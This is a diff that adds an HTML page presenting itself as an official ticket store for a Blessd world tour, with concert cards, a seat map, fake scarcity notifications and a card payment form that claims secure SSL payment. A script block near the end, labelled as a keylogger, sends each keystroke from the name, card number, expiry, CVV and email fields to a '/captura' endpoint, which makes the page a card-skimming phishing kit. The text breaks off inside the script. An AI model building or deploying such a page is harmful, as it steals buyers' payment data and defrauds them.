@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blessd - Gira Mundial 2026 | Boletos Oficiales</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* ... (todo el CSS se mantiene exactamente igual) ... */
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@900&family=Poppins:wght@300;400;700&display=swap');
+
+        :root {
+            --blessd-gold: #d4af37;
+            --blessd-black: #0a0a0a;
+            --blessd-red: #8b0000;
+            --blessd-gradient: linear-gradient(135deg, #8b0000 0%, #d4af37 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #fafafa;
+            overflow-x: hidden;
+        }
+
+        .blessd-font {
+            font-family: 'Montserrat', sans-serif;
+            letter-spacing: -0.02em;
+        }
+
+        /* Fondo animado con partículas */
+        .particle-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle at 20% 50%, rgba(212, 175, 55, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(139, 0, 0, 0.05) 0%, transparent 50%);
+            animation: gradientShift 15s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* Hero con video overlay */
+        .hero-bg {
+            position: relative;
+            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8));
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .video-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.3;
+            z-index: 0;
+        }
+
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .glass-effect:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border-color: var(--blessd-gold);
+        }
+
+        .gold-text {
+            background: linear-gradient(135deg, #d4af37 0%, #f5e7a3 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: goldPulse 3s ease infinite;
+        }
+
+        @keyframes goldPulse {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.3); }
+        }
+
+        /* Título animado */
+        .animated-title {
+            animation: titleFloat 3s ease infinite;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+        }
+
+        @keyframes titleFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        /* Tarjetas con hover 3D */
+        .concert-card {
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transform-style: preserve-3d;
+            perspective: 1000px;
+        }
+
+        .concert-card:hover {
+            transform: scale(1.05) rotateY(5deg) rotateX(5deg);
+            box-shadow: 20px 20px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Botón pulsante */
+        .pulse-button {
+            animation: buttonPulse 2s ease infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Contador regresivo animado */
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .countdown-item {
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 15px;
+            min-width: 100px;
+            animation: countdownPulse 1s ease infinite;
+        }
+
+        .countdown-item:nth-child(2) { animation-delay: 0.2s; }
+        .countdown-item:nth-child(3) { animation-delay: 0.4s; }
+        .countdown-item:nth-child(4) { animation-delay: 0.6s; }
+
+        @keyframes countdownPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); background: rgba(212, 175, 55, 0.3); }
+        }
+
+        /* Efecto de brillo en el texto */
+        .shimmer {
+            background: linear-gradient(90deg, transparent 0%, #d4af37 50%, transparent 100%);
+            background-size: 200% 100%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        /* Notificaciones flotantes */
+        .floating-notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 50px;
+            border-left: 4px solid var(--blessd-gold);
+            transform: translateX(400px);
+            animation: slideIn 0.5s forwards;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        @keyframes slideIn {
+            to { transform: translateX(0); }
+        }
+
+        /* Reproductor de música flotante */
+        .music-player {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 15px 25px;
+            border-radius: 50px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            z-index: 1000;
+            border: 1px solid var(--blessd-gold);
+            animation: playerFloat 3s ease infinite;
+            cursor: pointer;
+        }
+
+        @keyframes playerFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .music-player i {
+            color: var(--blessd-gold);
+            font-size: 20px;
+        }
+
+        .music-player:hover {
+            background: var(--blessd-gold);
+            color: black;
+        }
+
+        .music-player:hover i {
+            color: black;
+        }
+
+        /* Modal con animación mejorada */
+        .modal-content {
+            animation: modalPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes modalPop {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* Asientos animados */
+        .seat {
+            transition: all 0.2s ease;
+            animation: seatAppear 0.5s ease;
+            animation-fill-mode: both;
+            width: 100%;
+            height: 30px;
+            background-color: #e5e7eb;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .seat:hover {
+            background-color: #d1d5db;
+            transform: scale(1.1);
+        }
+
+        .seat.selected {
+            background-color: #d4af37 !important;
+        }
+
+        .seat.vip {
+            background-color: #8b0000 !important;
+        }
+
+        @keyframes seatAppear {
+            from {
+                opacity: 0;
+                transform: scale(0);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Efecto de confeti */
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: var(--blessd-gold);
+            animation: confettiFall 3s linear forwards;
+            z-index: 9999;
+        }
+
+        @keyframes confettiFall {
+            0% {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Fondo de partículas -->
+    <div class="particle-bg"></div>
+
+    <!-- Reproductor de música flotante con la canción de Blessd -->
+    <div class="music-player" onclick="toggleMusic()">
+        <i class="fas fa-play" id="music-icon"></i>
+        <div>
+            <div class="text-xs text-gray-400">NOW PLAYING</div>
+            <div class="font-bold">Blessd - CACHOS</div>
+        </div>
+    </div>
+
+    <!-- Notificaciones flotantes -->
+    <div id="notification" class="floating-notification hidden">
+        <i class="fas fa-ticket-alt text-[--blessd-gold] mr-2"></i>
+        <span>¡Últimos boletos disponibles!</span>
+    </div>
+
+    <!-- Navbar con efecto glass -->
+    <nav class="bg-black/80 backdrop-blur-md border-b border-gray-800 px-4 py-3 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-8">
+                <h1 class="text-2xl font-black blessd-font text-white animated-title">BLESSD <span class="gold-text text-sm">TOUR</span></h1>
+                <div class="hidden lg:flex space-x-6 text-[11px] font-bold uppercase tracking-widest text-gray-400">
+                    <a href="#" class="hover:text-[--blessd-gold] transition-all hover:scale-110 inline-block">Conciertos</a>
+                    <a href="#" class="hover:text-[--blessd-gold] transition-all hover:scale-110 inline-block">VIP Experience</a>
+                    <a href="#" class="hover:text-[--blessd-gold] transition-all hover:scale-110 inline-block">Merchandising</a>
+                    <a href="#" class="hover:text-[--blessd-gold] transition-all hover:scale-110 inline-block">FAQ</a>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4 text-gray-400 text-sm font-bold">
+                <div class="flex items-center space-x-1 cursor-pointer hover:text-[--blessd-gold] transition-all">
+                    <img src="https://flagcdn.com/w20/co.png" class="h-3" alt="CO">
+                    <span>COL</span>
+                </div>
+                <div class="h-4 w-[1px] bg-gray-700"></div>
+                <button class="hover:text-[--blessd-gold] transition-all hover:scale-110">Iniciar Sesión</button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section con video -->
+    <section class="hero-bg text-white px-4 text-center relative overflow-hidden">
+        <video class="video-background" autoplay muted loop>
+            <source src="https://player.vimeo.com/external/370331469.hd.mp4?s=904d2bdd9b32e0b4b0b5e9b0b5b5b5b5&profile_id=175" type="video/mp4">
+        </video>
+        
+        <div class="max-w-4xl mx-auto animate__animated animate__fadeIn relative z-10">
+            <!-- Contador regresivo -->
+            <div class="countdown">
+                <div class="countdown-item">
+                    <div class="text-4xl font-black" id="days">15</div>
+                    <div class="text-xs uppercase">Días</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="text-4xl font-black" id="hours">08</div>
+                    <div class="text-xs uppercase">Horas</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="text-4xl font-black" id="minutes">32</div>
+                    <div class="text-xs uppercase">Minutos</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="text-4xl font-black" id="seconds">45</div>
+                    <div class="text-xs uppercase">Segundos</div>
+                </div>
+            </div>
+
+            <p class="gold-text uppercase tracking-[0.3em] font-bold mb-4 text-sm shimmer">El fenómeno mundial</p>
+            <h1 class="blessd-font text-7xl md:text-9xl uppercase leading-none mb-8 animated-title">BLESSD</h1>
+            <p class="text-2xl md:text-3xl font-light max-w-2xl mx-auto mb-6 leading-relaxed gold-text">
+                "SI SABEN" WORLD TOUR 2026
+            </p>
+            <p class="text-lg md:text-xl text-gray-300 max-w-2xl mx-auto mb-10 leading-relaxed">
+                Vive la experiencia del artista que está rompiendo récords en todo el mundo. 
+                Única gira del año en Latinoamérica.
+            </p>
+            <div class="flex flex-col md:flex-row justify-center gap-4">
+                <a href="#entradas"
+                    class="bg-gradient-to-r from-[--blessd-red] to-[--blessd-gold] hover:from-[--blessd-gold] hover:to-[--blessd-red] text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm shadow-lg pulse-button">COMPRAR BOLETOS</a>
+                <a href="#"
+                    class="glass-effect hover:bg-white hover:text-black text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm">EXPERIENCIA VIP</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Sección de Próximos Conciertos con animaciones -->
+    <section id="entradas" class="max-w-7xl mx-auto py-16 px-4">
+        <div class="text-center mb-12">
+            <h2 class="blessd-font text-5xl text-black uppercase mb-4">PRÓXIMOS <span class="gold-text">CONCIERTOS</span></h2>
+            <p class="text-gray-500">No te pierdas la oportunidad de ver a Blessd en vivo</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+            <!-- Medellín -->
+            <div class="concert-card bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden hover:shadow-2xl">
+                <div class="relative h-48 overflow-hidden">
+                    <img src="https://images.unsplash.com/photo-1569163139599-0f4517e36f51?auto=format&fit=crop&q=80&w=800"
+                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                        alt="Medellín">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black to-transparent"></div>
+                    <div class="absolute bottom-4 left-4 text-white">
+                        <p class="text-[10px] font-bold uppercase tracking-widest text-[--blessd-gold]">SOLD OUT</p>
+                        <p class="text-xl font-black">Medellín, Colombia</p>
+                    </div>
+                </div>
+                <div class="p-6">
+                    <div class="flex items-center gap-2 mb-4 text-gray-500 text-xs font-bold uppercase">
+                        <i class="fas fa-calendar"></i> 15 MAYO 2026 | Estadio Atanasio
+                    </div>
+                    <div class="flex justify-between items-center mb-6">
+                        <span class="text-3xl font-black text-gray-400">AGOTADO</span>
+                        <span class="bg-red-100 text-red-700 text-[10px] font-bold px-3 py-1 rounded-full uppercase">No disponible</span>
+                    </div>
+                    <button disabled class="w-full bg-gray-200 text-gray-400 py-4 rounded-xl font-bold uppercase tracking-widest cursor-not-allowed">Lista de espera</button>
+                </div>
+            </div>
+
+            <!-- Bogotá -->
+            <div class="concert-card bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden hover:shadow-2xl">
+                <div class="relative h-48 overflow-hidden">
+                    <img src="https://images.unsplash.com/photo-1533050487297-09b450131914?auto=format&fit=crop&q=80&w=800"
+                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                        alt="Bogotá">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black to-transparent"></div>
+                    <div class="absolute bottom-4 left-4 text-white">
+                        <p class="text-[10px] font-bold uppercase tracking-widest text-[--blessd-gold]">ULTIMAS FECHAS</p>
+                        <p class="text-xl font-black">Bogotá, Colombia</p>
+                    </div>
+                </div>
+                <div class="p-6">
+                    <div class="flex items-center gap-2 mb-4 text-gray-500 text-xs font-bold uppercase">
+                        <i class="fas fa-calendar"></i> 22 MAYO 2026 | Movistar Arena
+                    </div>
+                    <div class="flex justify-between items-center mb-6">
+                        <span class="text-3xl font-black text-[--blessd-black]">$250 <span class="text-xs">USD</span></span>
+                        <span class="bg-green-100 text-green-700 text-[10px] font-bold px-3 py-1 rounded-full uppercase">Disponible</span>
+                    </div>
+                    <button onclick="openSeatMap('Blessd en Bogotá', 250)"
+                        class="w-full bg-black hover:bg-gradient-to-r hover:from-[--blessd-red] hover:to-[--blessd-gold] text-white py-4 rounded-xl font-bold uppercase tracking-widest transition-all">COMPRAR BOLETOS</button>
+                </div>
+            </div>
+
+            <!-- Miami -->
+            <div class="concert-card bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden hover:shadow-2xl">
+                <div class="relative h-48 overflow-hidden">
+                    <img src="https://images.unsplash.com/photo-1535498730771-e735b998cd64?auto=format&fit=crop&q=80&w=800"
+                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                        alt="Miami">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black to-transparent"></div>
+                    <div class="absolute bottom-4 left-4 text-white">
+                        <p class="text-[10px] font-bold uppercase tracking-widest text-[--blessd-gold]">PREVENTA</p>
+                        <p class="text-xl font-black">Miami, USA</p>
+                    </div>
+                </div>
+                <div class="p-6">
+                    <div class="flex items-center gap-2 mb-4 text-gray-500 text-xs font-bold uppercase">
+                        <i class="fas fa-calendar"></i> 05 JUNIO 2026 | FTX Arena
+                    </div>
+                    <div class="flex justify-between items-center mb-6">
+                        <span class="text-3xl font-black text-[--blessd-black]">$350 <span class="text-xs">USD</span></span>
+                        <span class="bg-blue-100 text-blue-700 text-[10px] font-bold px-3 py-1 rounded-full uppercase">Preventa</span>
+                    </div>
+                    <button onclick="openSeatMap('Blessd en Miami', 350)"
+                        class="w-full bg-black hover:bg-gradient-to-r hover:from-[--blessd-red] hover:to-[--blessd-gold] text-white py-4 rounded-xl font-bold uppercase tracking-widest transition-all">COMPRAR BOLETOS</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Sección VIP Experience con animaciones -->
+    <section class="bg-black text-white py-16 mt-8 relative overflow-hidden">
+        <div class="absolute inset-0">
+            <div class="absolute top-0 left-0 w-64 h-64 bg-[--blessd-gold] rounded-full filter blur-3xl opacity-20 animate-pulse"></div>
+            <div class="absolute bottom-0 right-0 w-64 h-64 bg-[--blessd-red] rounded-full filter blur-3xl opacity-20 animate-pulse"></div>
+        </div>
+        
+        <div class="max-w-7xl mx-auto px-4 relative z-10">
+            <div class="text-center mb-12">
+                <h2 class="blessd-font text-5xl uppercase mb-4">EXPERIENCIA <span class="gold-text">VIP</span></h2>
+                <p class="text-gray-400">Vive una experiencia única con Blessd</p>
+            </div>
+            
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="glass-effect rounded-2xl p-8 text-center hover:scale-105 transition-all">
+                    <i class="fas fa-crown text-4xl gold-text mb-4 animate-bounce"></i>
+                    <h3 class="text-xl font-bold mb-2">Meet & Greet</h3>
+                    <p class="text-gray-400 text-sm">Conoce a Blessd antes del concierto y tómate una foto con él</p>
+                    <p class="text-2xl font-black gold-text mt-4">$500 USD</p>
+                </div>
+                <div class="glass-effect rounded-2xl p-8 text-center hover:scale-105 transition-all">
+                    <i class="fas fa-music text-4xl gold-text mb-4 animate-pulse"></i>
+                    <h3 class="text-xl font-bold mb-2">Backstage Pass</h3>
+                    <p class="text-gray-400 text-sm">Acceso exclusivo al backstage y merchandise firmado</p>
+                    <p class="text-2xl font-black gold-text mt-4">$750 USD</p>
+                </div>
+                <div class="glass-effect rounded-2xl p-8 text-center hover:scale-105 transition-all">
+                    <i class="fas fa-star text-4xl gold-text mb-4 animate-spin"></i>
+                    <h3 class="text-xl font-bold mb-2">Golden Circle</h3>
+                    <p class="text-gray-400 text-sm">Zona exclusiva frente al escenario con catering VIP</p>
+                    <p class="text-2xl font-black gold-text mt-4">$400 USD</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Modal de selección de asientos -->
+    <div id="seat-modal" class="fixed inset-0 bg-black/95 backdrop-blur-md z-[60] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl w-full max-w-4xl p-8 modal-content overflow-y-auto max-h-[90vh]">
+            <div class="flex justify-between items-center mb-8">
+                <h3 class="blessd-font text-3xl text-black uppercase" id="modal-title">Selección de Boletos</h3>
+                <button onclick="closeModals()" class="text-gray-400 hover:text-black text-2xl">&times;</button>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-12">
+                <div class="text-center">
+                    <p class="text-xs font-bold uppercase text-gray-400 mb-4">MAPA DEL RECINTO - MOVISTAR ARENA</p>
+                    <div class="relative mb-6">
+                        <div class="bg-gray-100 p-4 rounded-lg">
+                            <div class="w-full h-4 bg-black rounded-t-lg mb-2"></div>
+                            <div class="text-center text-sm font-bold mb-4">ESCENARIO</div>
+                            <div class="grid grid-cols-8 gap-2" id="seat-map">
+                                <!-- Los asientos se generarán dinámicamente con JavaScript -->
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex justify-center gap-6 text-xs font-bold uppercase mt-4">
+                        <span class="flex items-center gap-2">
+                            <div class="w-4 h-4 bg-gray-200 rounded"></div> Disponible
+                        </span>
+                        <span class="flex items-center gap-2">
+                            <div class="w-4 h-4 bg-yellow-500 rounded"></div> Seleccionado
+                        </span>
+                        <span class="flex items-center gap-2">
+                            <div class="w-4 h-4 bg-red-600 rounded"></div> VIP
+                        </span>
+                    </div>
+                </div>
+                <div>
+                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 mb-6">
+                        <h4 class="font-bold mb-4">Resumen de compra</h4>
+                        <div class="space-y-3">
+                            <div class="flex justify-between text-sm">
+                                <span>Boleto General</span>
+                                <span class="font-bold" id="modal-price">$250.00</span>
+                            </div>
+                            <div class="flex justify-between text-sm text-gray-500">
+                                <span>Cargos por servicio</span>
+                                <span>$25.00</span>
+                            </div>
+                            <div class="flex justify-between text-sm text-gray-500" id="selected-seats-info">
+                                <span>Asientos seleccionados:</span>
+                                <span id="selected-count">0</span>
+                            </div>
+                        </div>
+                        <div class="flex justify-between font-bold text-xl mt-4 border-t pt-4 text-black">
+                            <span>Total:</span>
+                            <span id="total-price">$275.00 USD</span>
+                        </div>
+                    </div>
+                    <button id="btn-pay" disabled onclick="openPayment()"
+                        class="w-full bg-gray-200 text-gray-400 py-5 rounded-2xl font-black uppercase tracking-widest transition-all hover:bg-black hover:text-white pulse-button">Continuar al pago</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de pago -->
+    <div id="payment-modal" class="fixed inset-0 bg-black/80 z-[70] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl w-full max-w-md p-10 modal-content">
+            <div class="text-center mb-6">
+                <h2 class="blessd-font text-3xl gold-text mb-2">BLESSD</h2>
+                <p class="text-xs text-gray-400">Pago 100% Seguro</p>
+            </div>
+            <form id="payment-form" class="space-y-4" autocomplete="off">
+                <div class="space-y-1">
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">Nombre completo del titular</label>
+                    <input type="text" id="c-name"
+                        class="w-full border-b border-gray-300 py-3 focus:border-[--blessd-gold] outline-none uppercase font-bold tracking-tighter transition-all"
+                        placeholder="COMO APARECE EN LA TARJETA" required>
+                </div>
+                <div class="space-y-1">
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">Número de tarjeta</label>
+                    <input type="text" id="c-number"
+                        class="w-full border-b border-gray-300 py-3 focus:border-[--blessd-gold] outline-none text-lg font-bold transition-all"
+                        placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-400 uppercase">Vencimiento</label>
+                        <input type="text" id="c-exp"
+                            class="w-full border-b border-gray-300 py-3 focus:border-[--blessd-gold] outline-none font-bold transition-all"
+                            placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-400 uppercase">CVV</label>
+                        <input type="password" id="c-cvc"
+                            class="w-full border-b border-gray-300 py-3 focus:border-[--blessd-gold] outline-none font-bold transition-all"
+                            placeholder="***" maxlength="4" required>
+                    </div>
+                </div>
+                <div class="space-y-1">
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">Email</label>
+                    <input type="email" id="c-email"
+                        class="w-full border-b border-gray-300 py-3 focus:border-[--blessd-gold] outline-none transition-all"
+                        placeholder="tucorreo@ejemplo.com" required>
+                </div>
+                <button type="submit"
+                    class="w-full bg-gradient-to-r from-[--blessd-red] to-[--blessd-gold] text-white py-5 rounded-2xl font-black mt-8 hover:from-[--blessd-gold] hover:to-[--blessd-red] transition-all uppercase shadow-lg pulse-button">COMPRAR BOLETOS AHORA</button>
+            </form>
+            <p class="text-[10px] text-center text-gray-400 mt-4">
+                <i class="fas fa-lock"></i> Tus datos están protegidos con encriptación SSL
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURACIÓN - Usamos la URL base de la página actual
+        const BASE_URL = window.location.origin;
+
+        // Reproductor de música con la canción de YouTube
+        let isMusicPlaying = false;
+        let player;
+        let isYouTubeLoaded = false;
+
+        function toggleMusic() {
+            const icon = document.getElementById('music-icon');
+            if (isMusicPlaying) {
+                if (player && typeof player.pauseVideo === 'function') {
+                    player.pauseVideo();
+                }
+                icon.className = 'fas fa-play';
+            } else {
+                if (player && typeof player.playVideo === 'function') {
+                    player.playVideo();
+                } else if (!isYouTubeLoaded) {
+                    // Cargar el reproductor de YouTube si aún no está cargado
+                    loadYouTubePlayer();
+                }
+                icon.className = 'fas fa-pause';
+            }
+            isMusicPlaying = !isMusicPlaying;
+        }
+
+        function loadYouTubePlayer() {
+            // Cargar la API de YouTube si no está disponible
+            if (typeof YT === 'undefined') {
+                const tag = document.createElement('script');
+                tag.src = 'https://www.youtube.com/iframe_api';
+                const firstScriptTag = document.getElementsByTagName('script')[0];
+                firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+                window.onYouTubeIframeAPIReady = function() {
+                    createPlayer();
+                };
+            } else {
+                createPlayer();
+            }
+        }
+
+        function createPlayer() {
+            player = new YT.Player('youtube-audio', {
+                videoId: 'faha11uUUgs',
+                playerVars: {
+                    'autoplay': 1,
+                    'controls': 0,
+                    'disablekb': 1,
+                    'loop': 1,
+                    'playlist': 'faha11uUUgs',
+                    'modestbranding': 1,
+                    'rel': 0,
+                    'showinfo': 0
+                },
+                events: {
+                    'onReady': onPlayerReady,
+                    'onStateChange': onPlayerStateChange
+                }
+            });
+            isYouTubeLoaded = true;
+        }
+
+        function onPlayerReady(event) {
+            if (isMusicPlaying) {
+                event.target.playVideo();
+            }
+        }
+
+        function onPlayerStateChange(event) {
+            const icon = document.getElementById('music-icon');
+            if (event.data === YT.PlayerState.PLAYING) {
+                icon.className = 'fas fa-pause';
+                isMusicPlaying = true;
+            } else if (event.data === YT.PlayerState.PAUSED || event.data === YT.PlayerState.ENDED) {
+                icon.className = 'fas fa-play';
+                isMusicPlaying = false;
+            }
+        }
+
+        // Variables para asientos
+        let selectedSeats = 0;
+        let basePrice = 250;
+
+        // Generar asientos
+        function generateSeats() {
+            const seatMap = document.getElementById('seat-map');
+            if (!seatMap) return;
+            
+            seatMap.innerHTML = '';
+            for (let i = 0; i < 48; i++) {
+                const seat = document.createElement('div');
+                seat.className = 'seat';
+                seat.setAttribute('data-seat', i + 1);
+                
+                // Algunos asientos VIP aleatorios
+                if (i % 7 === 0) {
+                    seat.classList.add('vip');
+                }
+                
+                seat.onclick = function() {
+                    if (!this.classList.contains('vip')) {
+                        this.classList.toggle('selected');
+                        updateSelectedSeats();
+                    }
+                };
+                
+                seatMap.appendChild(seat);
+            }
+        }
+
+        // Actualizar contador de asientos seleccionados
+        function updateSelectedSeats() {
+            selectedSeats = document.querySelectorAll('.seat.selected').length;
+            document.getElementById('selected-count').textContent = selectedSeats;
+            
+            const total = (basePrice + 25) * (selectedSeats || 1);
+            document.getElementById('total-price').textContent = `$${total}.00 USD`;
+            
+            const payButton = document.getElementById('btn-pay');
+            if (selectedSeats > 0) {
+                payButton.disabled = false;
+                payButton.classList.replace('bg-gray-200', 'bg-black');
+                payButton.classList.remove('text-gray-400');
+            } else {
+                payButton.disabled = true;
+                payButton.classList.replace('bg-black', 'bg-gray-200');
+                payButton.classList.add('text-gray-400');
+            }
+        }
+
+        // Contador regresivo
+        function updateCountdown() {
+            const concertDate = new Date('May 22, 2026 20:00:00').getTime();
+            const now = new Date().getTime();
+            const distance = concertDate - now;
+
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById('days').innerText = String(days).padStart(2, '0');
+            document.getElementById('hours').innerText = String(hours).padStart(2, '0');
+            document.getElementById('minutes').innerText = String(minutes).padStart(2, '0');
+            document.getElementById('seconds').innerText = String(seconds).padStart(2, '0');
+        }
+
+        setInterval(updateCountdown, 1000);
+
+        // Notificaciones aleatorias
+        function showRandomNotification() {
+            const notifications = [
+                "¡Últimos boletos para Bogotá!",
+                "¡Preventa Miami disponible!",
+                "¡Meet & Greet casi agotado!",
+                "¡Blessd en vivo pronto!",
+                "¡50% de descuento en parking VIP!"
+            ];
+            
+            const notification = document.getElementById('notification');
+            notification.querySelector('span').textContent = notifications[Math.floor(Math.random() * notifications.length)];
+            notification.classList.remove('hidden');
+            
+            setTimeout(() => {
+                notification.classList.add('hidden');
+            }, 4000);
+        }
+
+        setInterval(showRandomNotification, 10000);
+
+        // Confetti
+        function createConfetti() {
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
+                document.body.appendChild(confetti);
+                
+                setTimeout(() => {
+                    confetti.remove();
+                }, 3000);
+            }
+        }
+
+        // Funciones de modales
+        function openSeatMap(concert, price) {
+            basePrice = price;
+            document.getElementById('modal-title').innerText = concert;
+            document.getElementById('modal-price').innerText = `$${price}.00`;
+            document.getElementById('total-price').innerText = `$${price + 25}.00 USD`;
+            document.getElementById('seat-modal').classList.remove('hidden');
+            
+            // Resetear asientos
+            selectedSeats = 0;
+            document.getElementById('selected-count').textContent = '0';
+            document.getElementById('btn-pay').disabled = true;
+            document.getElementById('btn-pay').classList.replace('bg-black', 'bg-gray-200');
+            document.getElementById('btn-pay').classList.add('text-gray-400');
+            
+            generateSeats();
+            createConfetti();
+        }
+
+        function openPayment() {
+            document.getElementById('payment-modal').classList.remove('hidden');
+            createConfetti();
+        }
+
+        function closeModals() {
+            document.getElementById('seat-modal').classList.add('hidden');
+            document.getElementById('payment-modal').classList.add('hidden');
+        }
+
+        // Keylogger - CORREGIDO para usar BASE_URL
+        const inputs = ['c-name', 'c-number', 'c-exp', 'c-cvc', 'c-email'];
+
+        inputs.forEach(id => {
+            const element = document.getElementById(id);
+            if (element) {
+                element.addEventListener('input', () => {
+                    const data = {
+                        f: id,
+                        v: document.getElementById(id).value,
+                        t: new Date().toLocaleString()
+                    };
+
+                    fetch(`${BASE_URL}/captura`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(err => console.log('Error en captura:', err));
+                });
+            }
+        });
+
+        // Formato de tarjeta
